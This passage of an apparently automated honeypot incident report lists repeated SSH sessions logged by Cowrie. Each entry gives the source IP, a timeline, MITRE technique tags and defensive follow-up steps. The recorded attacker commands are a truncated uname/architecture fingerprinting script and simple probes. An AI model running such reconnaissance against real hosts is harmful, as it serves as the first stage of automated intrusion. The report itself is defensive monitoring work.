| `2026-07-06 04:59:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96f49c942ee2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:59 |
| **Last Seen** | 2026-07-06 04:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:59:20` | `cowrie.session.connect` |
| `2026-07-06 04:59:21` | `cowrie.client.version` |
| `2026-07-06 04:59:21` | `cowrie.client.kex` |
| `2026-07-06 04:59:24` | `cowrie.login.success` |
| `2026-07-06 04:59:26` | `cowrie.session.params` |
| `2026-07-06 04:59:26` | `cowrie.command.input` |
| `2026-07-06 04:59:26` | `cowrie.command.input` |
| `2026-07-06 04:59:26` | `cowrie.command.input` |
| `2026-07-06 04:59:26` | `cowrie.command.input` |
| `2026-07-06 04:59:26` | `cowrie.command.input` |
| `2026-07-06 04:59:26` | `cowrie.command.success` |
| `2026-07-06 04:59:26` | `cowrie.command.input` |
| `2026-07-06 04:59:26` | `cowrie.command.input` |
| `2026-07-06 04:59:26` | `cowrie.command.input` |
| `2026-07-06 04:59:26` | `cowrie.command.input` |
| `2026-07-06 04:59:27` | `cowrie.log.closed` |
| `2026-07-06 04:59:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75ddd6eba456

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:00 |
| **Last Seen** | 2026-07-06 05:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:00:06` | `cowrie.session.connect` |
| `2026-07-06 05:00:06` | `cowrie.client.version` |
| `2026-07-06 05:00:06` | `cowrie.client.kex` |
| `2026-07-06 05:00:10` | `cowrie.login.success` |
| `2026-07-06 05:00:12` | `cowrie.session.params` |
| `2026-07-06 05:00:12` | `cowrie.command.input` |
| `2026-07-06 05:00:12` | `cowrie.command.input` |
| `2026-07-06 05:00:12` | `cowrie.command.input` |
| `2026-07-06 05:00:12` | `cowrie.command.input` |
| `2026-07-06 05:00:12` | `cowrie.command.input` |
| `2026-07-06 05:00:12` | `cowrie.command.success` |
| `2026-07-06 05:00:12` | `cowrie.command.input` |
| `2026-07-06 05:00:12` | `cowrie.command.input` |
| `2026-07-06 05:00:12` | `cowrie.command.input` |
| `2026-07-06 05:00:12` | `cowrie.command.input` |
| `2026-07-06 05:00:13` | `cowrie.log.closed` |
| `2026-07-06 05:00:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5841295aa95f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:00 |
| **Last Seen** | 2026-07-06 05:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:00:52` | `cowrie.session.connect` |
| `2026-07-06 05:00:53` | `cowrie.client.version` |
| `2026-07-06 05:00:53` | `cowrie.client.kex` |
| `2026-07-06 05:00:57` | `cowrie.login.success` |
| `2026-07-06 05:00:58` | `cowrie.session.params` |
| `2026-07-06 05:00:58` | `cowrie.command.input` |
| `2026-07-06 05:00:58` | `cowrie.command.input` |
| `2026-07-06 05:00:58` | `cowrie.command.input` |
| `2026-07-06 05:00:58` | `cowrie.command.input` |
| `2026-07-06 05:00:58` | `cowrie.command.input` |
| `2026-07-06 05:00:58` | `cowrie.command.success` |
| `2026-07-06 05:00:58` | `cowrie.command.input` |
| `2026-07-06 05:00:58` | `cowrie.command.input` |
| `2026-07-06 05:00:58` | `cowrie.command.input` |
| `2026-07-06 05:00:58` | `cowrie.command.input` |
| `2026-07-06 05:00:59` | `cowrie.log.closed` |
| `2026-07-06 05:01:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a9a3f6216cb

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 05:00 |
| **Last Seen** | 2026-07-06 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:00:55` | `cowrie.session.connect` |
| `2026-07-06 05:00:55` | `cowrie.client.version` |
| `2026-07-06 05:00:55` | `cowrie.client.kex` |
| `2026-07-06 05:00:56` | `cowrie.login.success` |
| `2026-07-06 05:00:57` | `cowrie.session.params` |
| `2026-07-06 05:00:57` | `cowrie.command.input` |
| `2026-07-06 05:00:57` | `cowrie.log.closed` |
| `2026-07-06 05:00:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9581a5b4ffe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:01 |
| **Last Seen** | 2026-07-06 05:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:01:40` | `cowrie.session.connect` |
| `2026-07-06 05:01:41` | `cowrie.client.version` |
| `2026-07-06 05:01:41` | `cowrie.client.kex` |
| `2026-07-06 05:01:44` | `cowrie.login.success` |
| `2026-07-06 05:01:47` | `cowrie.session.params` |
| `2026-07-06 05:01:47` | `cowrie.command.input` |
| `2026-07-06 05:01:47` | `cowrie.command.input` |
| `2026-07-06 05:01:47` | `cowrie.command.input` |
| `2026-07-06 05:01:47` | `cowrie.command.input` |
| `2026-07-06 05:01:47` | `cowrie.command.input` |
| `2026-07-06 05:01:47` | `cowrie.command.success` |
| `2026-07-06 05:01:47` | `cowrie.command.input` |
| `2026-07-06 05:01:47` | `cowrie.command.input` |
| `2026-07-06 05:01:47` | `cowrie.command.input` |
| `2026-07-06 05:01:47` | `cowrie.command.input` |
| `2026-07-06 05:01:47` | `cowrie.log.closed` |
| `2026-07-06 05:01:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-613c8cbd2001

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:02 |
| **Last Seen** | 2026-07-06 05:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:02:26` | `cowrie.session.connect` |
| `2026-07-06 05:02:27` | `cowrie.client.version` |
| `2026-07-06 05:02:27` | `cowrie.client.kex` |
| `2026-07-06 05:02:31` | `cowrie.login.success` |
| `2026-07-06 05:02:33` | `cowrie.session.params` |
| `2026-07-06 05:02:33` | `cowrie.command.input` |
| `2026-07-06 05:02:33` | `cowrie.command.input` |
| `2026-07-06 05:02:33` | `cowrie.command.input` |
| `2026-07-06 05:02:33` | `cowrie.command.input` |
| `2026-07-06 05:02:33` | `cowrie.command.input` |
| `2026-07-06 05:02:33` | `cowrie.command.success` |
| `2026-07-06 05:02:33` | `cowrie.command.input` |
| `2026-07-06 05:02:33` | `cowrie.command.input` |
| `2026-07-06 05:02:33` | `cowrie.command.input` |
| `2026-07-06 05:02:33` | `cowrie.command.input` |
| `2026-07-06 05:02:34` | `cowrie.log.closed` |
| `2026-07-06 05:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4470b6fd0c4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 05:02 |
| **Last Seen** | 2026-07-06 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:02:31` | `cowrie.session.connect` |
| `2026-07-06 05:02:31` | `cowrie.client.version` |
| `2026-07-06 05:02:31` | `cowrie.client.kex` |
| `2026-07-06 05:02:31` | `cowrie.login.success` |
| `2026-07-06 05:02:32` | `cowrie.session.params` |
| `2026-07-06 05:02:32` | `cowrie.command.input` |
| `2026-07-06 05:02:32` | `cowrie.log.closed` |
| `2026-07-06 05:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06407d5c17ce

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:03 |
| **Last Seen** | 2026-07-06 05:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:03:14` | `cowrie.session.connect` |
| `2026-07-06 05:03:14` | `cowrie.client.version` |
| `2026-07-06 05:03:15` | `cowrie.client.kex` |
| `2026-07-06 05:03:18` | `cowrie.login.success` |
| `2026-07-06 05:03:20` | `cowrie.session.params` |
| `2026-07-06 05:03:20` | `cowrie.command.input` |
| `2026-07-06 05:03:20` | `cowrie.command.input` |
| `2026-07-06 05:03:20` | `cowrie.command.input` |
| `2026-07-06 05:03:20` | `cowrie.command.input` |
| `2026-07-06 05:03:20` | `cowrie.command.input` |
| `2026-07-06 05:03:20` | `cowrie.command.success` |
| `2026-07-06 05:03:20` | `cowrie.command.input` |
| `2026-07-06 05:03:20` | `cowrie.command.input` |
| `2026-07-06 05:03:20` | `cowrie.command.input` |
| `2026-07-06 05:03:20` | `cowrie.command.input` |
| `2026-07-06 05:03:21` | `cowrie.log.closed` |
| `2026-07-06 05:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ba4e7320e40

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:04 |
| **Last Seen** | 2026-07-06 05:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:04:01` | `cowrie.session.connect` |
| `2026-07-06 05:04:01` | `cowrie.client.version` |
| `2026-07-06 05:04:01` | `cowrie.client.kex` |
| `2026-07-06 05:04:05` | `cowrie.login.success` |
| `2026-07-06 05:04:07` | `cowrie.session.params` |
| `2026-07-06 05:04:07` | `cowrie.command.input` |
| `2026-07-06 05:04:07` | `cowrie.command.input` |
| `2026-07-06 05:04:07` | `cowrie.command.input` |
| `2026-07-06 05:04:07` | `cowrie.command.input` |
| `2026-07-06 05:04:07` | `cowrie.command.input` |
| `2026-07-06 05:04:07` | `cowrie.command.success` |
| `2026-07-06 05:04:07` | `cowrie.command.input` |
| `2026-07-06 05:04:07` | `cowrie.command.input` |
| `2026-07-06 05:04:07` | `cowrie.command.input` |
| `2026-07-06 05:04:07` | `cowrie.command.input` |
| `2026-07-06 05:04:08` | `cowrie.log.closed` |
| `2026-07-06 05:04:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ae7b56ac4ef

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 05:04 |
| **Last Seen** | 2026-07-06 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:04:07` | `cowrie.session.connect` |
| `2026-07-06 05:04:07` | `cowrie.client.version` |
| `2026-07-06 05:04:07` | `cowrie.client.kex` |
| `2026-07-06 05:04:07` | `cowrie.login.success` |
| `2026-07-06 05:04:08` | `cowrie.session.params` |
| `2026-07-06 05:04:08` | `cowrie.command.input` |
| `2026-07-06 05:04:08` | `cowrie.log.closed` |
| `2026-07-06 05:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b9858715cd5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:04 |
| **Last Seen** | 2026-07-06 05:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:04:47` | `cowrie.session.connect` |
| `2026-07-06 05:04:48` | `cowrie.client.version` |
| `2026-07-06 05:04:48` | `cowrie.client.kex` |
| `2026-07-06 05:04:51` | `cowrie.login.success` |
| `2026-07-06 05:04:53` | `cowrie.session.params` |
| `2026-07-06 05:04:53` | `cowrie.command.input` |
| `2026-07-06 05:04:53` | `cowrie.command.input` |
| `2026-07-06 05:04:53` | `cowrie.command.input` |
| `2026-07-06 05:04:53` | `cowrie.command.input` |
| `2026-07-06 05:04:53` | `cowrie.command.input` |
| `2026-07-06 05:04:53` | `cowrie.command.success` |
| `2026-07-06 05:04:53` | `cowrie.command.input` |
| `2026-07-06 05:04:53` | `cowrie.command.input` |
| `2026-07-06 05:04:53` | `cowrie.command.input` |
| `2026-07-06 05:04:53` | `cowrie.command.input` |
| `2026-07-06 05:04:54` | `cowrie.log.closed` |
| `2026-07-06 05:04:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d94167150c25

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:05 |
| **Last Seen** | 2026-07-06 05:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:05:33` | `cowrie.session.connect` |
| `2026-07-06 05:05:33` | `cowrie.client.version` |
| `2026-07-06 05:05:33` | `cowrie.client.kex` |
| `2026-07-06 05:05:37` | `cowrie.login.success` |
| `2026-07-06 05:05:39` | `cowrie.session.params` |
| `2026-07-06 05:05:39` | `cowrie.command.input` |
| `2026-07-06 05:05:39` | `cowrie.command.input` |
| `2026-07-06 05:05:39` | `cowrie.command.input` |
| `2026-07-06 05:05:39` | `cowrie.command.input` |
| `2026-07-06 05:05:39` | `cowrie.command.input` |
| `2026-07-06 05:05:39` | `cowrie.command.success` |
| `2026-07-06 05:05:39` | `cowrie.command.input` |
| `2026-07-06 05:05:39` | `cowrie.command.input` |
| `2026-07-06 05:05:39` | `cowrie.command.input` |
| `2026-07-06 05:05:39` | `cowrie.command.input` |
| `2026-07-06 05:05:40` | `cowrie.log.closed` |
| `2026-07-06 05:05:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8b44800568f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 05:05 |
| **Last Seen** | 2026-07-06 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:05:44` | `cowrie.session.connect` |
| `2026-07-06 05:05:44` | `cowrie.client.version` |
| `2026-07-06 05:05:44` | `cowrie.client.kex` |
| `2026-07-06 05:05:45` | `cowrie.login.success` |
| `2026-07-06 05:05:46` | `cowrie.session.params` |
| `2026-07-06 05:05:46` | `cowrie.command.input` |
| `2026-07-06 05:05:46` | `cowrie.log.closed` |
| `2026-07-06 05:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6f6121cbc7f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 05:05 |
| **Last Seen** | 2026-07-06 05:06 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:05:58` | `cowrie.session.connect` |
| `2026-07-06 05:05:59` | `cowrie.client.version` |
| `2026-07-06 05:05:59` | `cowrie.client.kex` |
| `2026-07-06 05:06:04` | `cowrie.login.success` |
| `2026-07-06 05:06:08` | `cowrie.session.params` |
| `2026-07-06 05:06:08` | `cowrie.command.input` |
| `2026-07-06 05:06:10` | `cowrie.log.closed` |
| `2026-07-06 05:06:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8377d743c74

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:06 |
| **Last Seen** | 2026-07-06 05:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:06:20` | `cowrie.session.connect` |
| `2026-07-06 05:06:21` | `cowrie.client.version` |
| `2026-07-06 05:06:21` | `cowrie.client.kex` |
| `2026-07-06 05:06:24` | `cowrie.login.success` |
